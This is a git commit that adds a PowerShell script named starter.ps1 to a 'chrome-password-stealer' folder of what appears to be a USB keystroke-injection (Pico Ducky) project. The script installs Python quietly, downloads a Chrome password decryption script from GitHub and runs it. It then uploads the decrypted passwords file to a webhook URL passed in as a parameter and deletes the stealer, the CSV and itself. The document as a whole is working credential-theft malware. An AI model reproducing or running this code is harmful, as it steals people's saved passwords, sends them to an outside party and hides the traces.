e5e8eb07989abc24c4be9703d92f03209372e193
simen64 <97337442+simen64@users.noreply.github.com>
2023-09-01 17:52:42 +0200

    Added needed files

---
+++ chrome-password-stealer/starter.ps1
@@ -0,0 +1,60 @@
+param (
+  [string]$webhookUrl
+)
+
+$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
+
+if (Test-Path -Path $filePath -PathType Leaf) {
+
+    Write-Host "Python is already installed"
+
+} else {
+
+    Write-Host "Python does not exist"
+    winget install python3 --force -h --accept-source-agreements
+}
+
+py -m pip install pycryptodomex pywin32
+
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Pico-Ducky-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
+
+& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
+
+
+
+$user = $env:USERNAME
+
+$file = "C:\Users\$user\Documents\decrypted_password.csv"
+
+$message = "Extracted passwords:"
+
+$boundary = [System.Guid]::NewGuid().ToString()
+
+$fileContent = [System.IO.File]::ReadAllBytes($file)
+
+$bodyLines = @(
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"content`"",
+    "",
+    $message,
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"file`"; filename=`"file.txt`"",
+    "Content-Type: application/octet-stream",
+    "",
+    [System.Text.Encoding]::Default.GetString($fileContent),
+    "--$boundary--"
+)
+
+$body = $bodyLines -join "`r`n"
+
+$headers = @{
+    "Content-Type" = "multipart/form-data; boundary=$boundary"
+}
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
+
+Remove-Item stealer.py -Force
+Remove-item decrypted_password.csv -Force
+Remove-Item -Path $MyInvocation.MyCommand.Source
+
+pause
